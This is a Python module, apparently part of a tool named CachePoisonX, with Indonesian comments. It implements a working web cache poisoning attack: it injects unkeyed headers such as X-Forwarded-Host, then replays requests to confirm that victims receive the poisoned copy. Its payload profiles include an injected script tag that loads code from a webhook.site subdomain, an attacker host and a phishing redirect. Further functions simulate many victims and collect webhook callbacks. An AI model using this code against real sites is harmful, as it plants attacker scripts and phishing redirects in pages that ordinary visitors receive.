"""modules.injector — Mesin injeksi payload ke cache (mode ATTACK).

Beda dengan modules.poisoning (mode deteksi), modul ini tidak berhenti di
"kok bisa direfleksikan". Ia benar-benar MENANAM payload ke cache, lalu
membuktikan bahwa payload itu disajikan ke request berikutnya — dengan jejak
header cache sebagai bukti (MISS -> HIT).

Alur satu percobaan injeksi (3 langkah, semuanya direkam jadi timeline):

  1. BASELINE  GET url tanpa payload
               -> catat X-Cache, Age, Content-Length (kondisi bersih)
  2. INJECT    GET url dengan <header>: <payload>
               -> payload masuk response; response ini yang di-cache
  3. REPLAY    GET url TANPA header (pura-pura jadi korban)
               -> payload masih muncul? X-Cache HIT?
                  Kalau ya: cache sudah teracuni, korban menerima payload.

Jejak header (X-Cache: MISS -> MISS -> HIT, Age naik, Content-Length berubah)
adalah bukti bahwa yang disajikan bukan response origin lagi, melainkan
salinan yang sudah dimodifikasi.

Payload default sengaja mengandung marker acak per run, supaya HIT dari run
sebelumnya tidak pernah dianggap sebagai keberhasilan run ini.
"""

import re
import uuid
import logging
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

import requests

log = logging.getLogger("CachePoisonX.injector")


# Header yang lazim tidak masuk cache key. Dipakai kalau user tidak memilih.
INJECT_HEADERS = [
    "X-Forwarded-Host",
    "X-Forwarded-Scheme",
    "X-Forwarded-Proto",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Host",
    "X-HTTP-Host-Override",
    "X-Forwarded-Server",
    "Forwarded",
]

# Profil payload siap pakai. {m} = marker unik per percobaan, {h} = host target.
PAYLOAD_PROFILES = {
    # Domain penyerang sebagai host. Kalau direfleksikan ke canonical/og:url,
    # browser korban akan menganggap situs penyerang sebagai URL resmi.
    "host": "{m}.evil.test",
    # Subdomain webhook. Setiap korban yang memuat aset dari host ini akan
    # meninggalkan jejak (request) di dashboard webhook penyerang.
    "webhook": "{m}.webhook.site",
    # Payload yang mencoba memecah atribut dan menyisipkan script eksternal.
    "script": '"><script src=//{m}.webhook.site/p.js></script>',
    # Redirect protocol-relative ke situs penyerang.
    "redirect": "//{m}.evil.test/phish",
    # Path absolut, untuk header seperti X-Original-URL.
    "path": "/{m}-admin",
}

# Atribut HTML yang, kalau memuat payload, berarti browser korban akan
# menghubungi host penyerang (bukan cuma teks yang kebaca).
LOADING_ATTRS = ("src", "href", "action", "formaction", "data-src", "poster")
META_URL_ATTRS = ("og:url", "og:image", "twitter:image", "canonical")


class CacheInjector:
    """Menanam payload ke cache lalu membuktikan persistensinya."""

    def __init__(self, limiter=None, timeout: int = 15, use_buster: bool = False):
        self.limiter = limiter
        self.timeout = timeout
        self.use_buster = use_buster
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": (
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
                ),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "id-ID,id;q=0.9,en;q=0.8",
                "Connection": "close",
            }
        )

    # ------------------------------------------------------------------
    # Util
    # ------------------------------------------------------------------
    def _wait(self):
        if self.limiter:
            self.limiter.wait()

    @staticmethod
    def new_marker() -> str:
        return "cp" + uuid.uuid4().hex[:10]

    @staticmethod
    def build_payload(profile: str, marker: str, target: str = "") -> str:
        """Bangun payload dari profil. Profil tak dikenal = payload literal."""
        tmpl = PAYLOAD_PROFILES.get(profile, profile)
        return tmpl.replace("{m}", marker).replace("{h}", target)

    @staticmethod
    def with_query(url: str, query: str) -> str:
        """Tempel query string ke URL."""
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}{query}"

    def _url_for(self, base_url: str, marker: str) -> str:
        """URL tempat payload ditanam.

        Default: URL apa adanya (serangan nyata ke satu URL).
        --buster: tambah query unik supaya tiap percobaan punya slot cache
        sendiri (dipakai saat menguji banyak header di satu URL).
        """
        if not self.use_buster:
            return base_url
        return self.with_query(base_url, f"{marker}=1")

    @staticmethod
    def cache_headers(resp) -> Dict[str, str]:
        """Ambil jejak header cache dari response."""
        keys = {
            "x-cache", "x-cache-status", "cf-cache-status", "x-varnish",
            "x-proxy-cache", "age", "cache-control", "content-length",
            "x-cache-hits", "surrogate-control", "cdn-cache-control",
        }
        return {k: v for k, v in resp.headers.items() if k.lower() in keys}

    @staticmethod
    def cache_state(headers: Dict[str, str]) -> str:
        """Normalisasi status cache jadi hit / miss / unknown."""
        for name, value in headers.items():
            n, v = name.lower(), (value or "").upper()
            if n in ("x-cache", "x-cache-status", "cf-cache-status",
                     "x-proxy-cache", "x-varnish"):
                if "HIT" in v:
                    return "hit"
                if any(t in v for t in ("MISS", "BYPASS", "EXPIRED", "DYNAMIC")):
                    return "miss"
        return "unknown"

    # ------------------------------------------------------------------
    # Analisis konteks refleksi
    # ------------------------------------------------------------------
    @staticmethod
    def analyse_context(body: str, payload: str, pad: int = 140) -> Dict[str, Any]:
        """Di mana payload muncul, dan apakah browser korban akan memuatnya.

        Ini yang membedakan "payload muncul di teks" dengan "payload dipakai
        browser untuk menghubungi host penyerang". Yang kedua baru berdampak.
        """
        if not payload or payload.lower() not in (body or "").lower():
            return {"present": False, "snippet": "", "loads_remote": False,
                    "contexts": []}

        idx = body.lower().find(payload.lower())
        start = max(0, idx - pad)
        end = min(len(body), idx + len(payload) + pad)
        snippet = re.sub(r"\s+", " ", body[start:end]).strip()

        # Cari atribut terdekat sebelum payload: src="..., href="..., dll.
        before = body[max(0, idx - 260):idx]
        attr_hits = []
        for attr in LOADING_ATTRS:
            if re.search(attr + r"\s*=\s*[\"']?[^\"'>]*$", before, re.IGNORECASE):
                attr_hits.append(attr)
        for meta in META_URL_ATTRS:
            if re.search(r"(og:url|canonical|content)\s*=\s*[\"'][^\"']*$",
                         before, re.IGNORECASE):
                attr_hits.append(meta)

        in_script = bool(re.search(r"<script[^>]*>[^<]*$", before, re.IGNORECASE))
        contexts = sorted(set(attr_hits))

        return {
            "present": True,
            "snippet": snippet,
            "loads_remote": bool(contexts) or in_script,
            "in_script": in_script,
            "contexts": contexts,
        }

    # ------------------------------------------------------------------
    # Satu percobaan injeksi
    # ------------------------------------------------------------------
    def attempt(self, url: str, header: str, payload: str,
                marker: str) -> Dict[str, Any]:
        """Jalankan injeksi: INJECT dulu, baru REPLAY (urutan penyerang asli).

        Urutan ini penting. Kalau baseline dikirim lebih dulu ke URL yang sama,
        request itu SENDIRI yang mengisi cache dengan salinan bersih — lalu
        request injeksi menerima HIT salinan bersih itu dan payload tidak pernah
        masuk. Itu bug yang ada di v1 tool ini. Jadi:

          langkah 0: probe URL terpisah (ber-cache-buster) -> hanya untuk tahu
                     ada cache atau tidak, TIDAK menyentuh URL target
          langkah 1: INJECT ke URL target (request penyerang)
          langkah 2: REPLAY tanpa header (request korban)
        """
        target = self._url_for(url, marker)
        timeline: List[Dict[str, Any]] = []

        # ---------- 0) PROBE cache di URL terpisah ----------
        # Probe HARUS memakai URL yang berbeda, terlepas dari --buster. Kalau
        # probe memakai URL target, request probe itu sendiri yang mengisi cache
        # dengan salinan bersih — lalu injeksi menerima HIT salinan bersih dan
        # payload tidak pernah masuk. Ini bug yang sama dengan v1.
        probe_url = self.with_query(url, f"probe{marker}=1")
        self._wait()
        try:
            probe = self.session.get(probe_url, timeout=self.timeout,
                                     allow_redirects=True)
            probe_hdr = self.cache_headers(probe)
            timeline.append({
                "step": 0,
                "action": "PROBE cache (URL terpisah, tidak menyentuh target)",
                "request_headers": {},
                "status": probe.status_code,
                "cache": probe_hdr,
                "cache_state": self.cache_state(probe_hdr),
                "payload_present": False,
                "note": "hanya memastikan ada layer cache",
            })
        except requests.RequestException as e:
            return {"header": header, "payload": payload, "target": target,
                    "error": f"probe gagal: {e}", "timeline": timeline,
                    "injected": False}

        # ---------- 1) INJECT ----------
        self._wait()
        try:
            inj = self.session.get(target, timeout=self.timeout,
                                   headers={header: payload},
                                   allow_redirects=True)
        except requests.RequestException as e:
            return {"header": header, "payload": payload, "target": target,
                    "error": f"inject gagal: {e}", "timeline": timeline,
                    "injected": False}

        inj_hdr = self.cache_headers(inj)
        inj_state = self.cache_state(inj_hdr)
        inj_body = inj.text or ""
        ctx = self.analyse_context(inj_body, payload)
        timeline.append({
            "step": 1,
            "action": f"INJECT ({header}: {payload})",
            "request_headers": {header: payload},
            "status": inj.status_code,
            "cache": inj_hdr,
            "cache_state": inj_state,
            "payload_present": ctx["present"],
            "note": ("cache MISS -> response ini yang disimpan"
                     if inj_state == "miss" else
                     "cache HIT -> cache sudah berisi salinan lebih dulu"),
        })

        # Cache sudah hangat dengan salinan bersih: payload tidak akan masuk.
        if inj_state == "hit" and not ctx["present"]:
            return {
                "header": header, "payload": payload, "marker": marker,
                "target": target, "timeline": timeline, "injected": False,
                "verdict": "CACHE_WARM",
                "reason": ("cache sudah menyimpan salinan bersih untuk URL ini "
                           "sebelum injeksi. Payload tidak masuk. Perlu tunggu "
                           "TTL habis, atau kosongkan cache target lebih dulu."),
                "context": ctx,
            }

        if not ctx["present"]:
            return {"header": header, "payload": payload, "marker": marker,
                    "target": target, "timeline": timeline, "injected": False,
                    "verdict": "IGNORED",
                    "reason": "payload tidak muncul di response — header diabaikan"}

        # ---------- 3) REPLAY sebagai korban ----------
        self._wait()
        try:
            rep = self.session.get(target, timeout=self.timeout,
                                   allow_redirects=True)
        except requests.RequestException as e:
            return {"header": header, "payload": payload, "target": target,
                    "timeline": timeline, "injected": False,
                    "context": ctx, "reason": f"replay gagal: {e}"}

        rep_hdr = self.cache_headers(rep)
        rep_state = self.cache_state(rep_hdr)
        rep_ctx = self.analyse_context(rep.text or "", payload)
        timeline.append({
            "step": 2,
            "action": "REPLAY (tanpa header — pura-pura korban)",
            "request_headers": {},
            "status": rep.status_code,
            "cache": rep_hdr,
            "cache_state": rep_state,
            "payload_present": rep_ctx["present"],
            "note": "payload disajikan tanpa penyerang mengirim header",
        })

        # ---------- Verdict ----------
        persists = rep_ctx["present"]
        cache_hit = rep_state == "hit"

        if persists and cache_hit:
            verdict, reason = "INJECTED", "payload persist di cache HIT"
        elif persists:
            verdict, reason = "PERSISTS_NO_CACHE", (
                "payload tetap muncul di replay tapi tidak ada cache HIT — "
                "kemungkinan response di-generate ulang, bukan dari cache")
        else:
            verdict, reason = "NOT_STICKY", (
                "payload hilang saat replay — refleksi saja, cache tidak "
                "menyimpannya")

        return {
            "header": header,
            "payload": payload,
            "marker": marker,
            "target": target,
            "timeline": timeline,
            "injected": verdict == "INJECTED",
            "verdict": verdict,
            "reason": reason,
            "persists": persists,
            "cache_hit_on_replay": cache_hit,
            "context": ctx,
            "replay_context": rep_ctx,
            "loads_remote": rep_ctx["loads_remote"],
            "contexts": rep_ctx["contexts"],
            "snippet": rep_ctx["snippet"],
        }

    def fetch_hook_events(self, api_url: str) -> Dict[str, Any]:
        """Ambil log hit dari endpoint webhook (mis. lab /_events).

        Dipakai untuk membuktikan bahwa payload benar-benar dipanggil: bukan
        cuma "ada di HTML", tapi ada request yang masuk ke endpoint penyerang.
        """
        self._wait()
        try:
            resp = self.session.get(api_url, timeout=self.timeout)
            data = resp.json()
        except (requests.RequestException, ValueError) as e:
            return {"error": str(e), "hits": [], "count": 0}

        hits = data.get("hits", data if isinstance(data, list) else [])
        return {"count": len(hits), "hits": hits}

    # ------------------------------------------------------------------
    # Simulasi korban: replay N kali, hitung berapa yang kena
    # ------------------------------------------------------------------
    def simulate_victims(self, target: str, payload: str, marker: str,
                         count: int = 5) -> Dict[str, Any]:
        """Replay URL yang sudah teracuni tanpa header, N kali.

        Setiap replay mewakili satu pengunjung baru yang tidak mengirim header
        apa pun. Kalau payload tetap muncul di semua replay, berarti semua
        korban menerima versi teracuni — inilah "inject banyak".
        """
        hits, samples = 0, []
        for i in range(count):
            self._wait()
            try:
                resp = self.session.get(target, timeout=self.timeout,
                                        allow_redirects=True)
            except requests.RequestException as e:
                samples.append({"victim": i + 1, "error": str(e)})
                continue
            hdr = self.cache_headers(resp)
            ctx = self.analyse_context(resp.text or "", payload)
            state = self.cache_state(hdr)
            if ctx["present"]:
                hits += 1
            samples.append({
                "victim": i + 1,
                "cache": state,
                "cache_headers": hdr,
                "payload_present": ctx["present"],
                "loads_remote": ctx["loads_remote"],
            })

        return {
            "attempted": count,
            "poisoned": hits,
            "ratio": f"{hits}/{count}",
            "samples": samples,
        }

    # ------------------------------------------------------------------
    # Banyak percobaan sekaligus
    # ------------------------------------------------------------------
    def run(self, url: str, headers: List[str],
            payloads: List[str], victims: int = 0) -> List[Dict[str, Any]]:
        """Coba setiap kombinasi header x payload. Semua dicatat."""
        results = []
        for header in headers:
            for profile in payloads:
                marker = self.new_marker()
                payload = self.build_payload(profile, marker,
                                             urlparse(url).hostname or "")
                log.info(f"injeksi: {header} = {payload}")
                res = self.attempt(url, header, payload, marker)
                res["profile"] = profile

                if res.get("injected") and victims > 0:
                    log.info(f"  simulasi {victims} korban...")
                    res["victims"] = self.simulate_victims(
                        res["target"], payload, marker, victims)
                    log.warning(
                        f"  {res['victims']['poisoned']} dari "
                        f"{victims} korban menerima payload")

                results.append(res)

                if res.get("injected"):
                    log.warning(f"  [INJECTED] {header} -> payload persist "
                                f"di cache HIT ({res['target']})")
                elif res.get("error"):
                    log.info(f"  [error] {res['error']}")
                else:
                    log.info(f"  [{res.get('verdict', 'SKIP')}] "
                             f"{res.get('reason', '-')}")
        return results